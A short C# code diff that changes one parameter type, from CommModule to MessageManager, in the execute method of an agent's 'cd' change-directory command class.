@@ -11,7 +11,7 @@ namespace Agent.Commands
     public class ChangeDirectoryCommand : AgentCommand
     {
         public override string Name => "cd";
-        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, CommModule commm)
+        public override void InnerExecute(AgentTask task, Models.Agent agent, AgentTaskResult result, MessageManager commm)
         {
             string path;
             if(task.SplittedArgs.Length == 0)
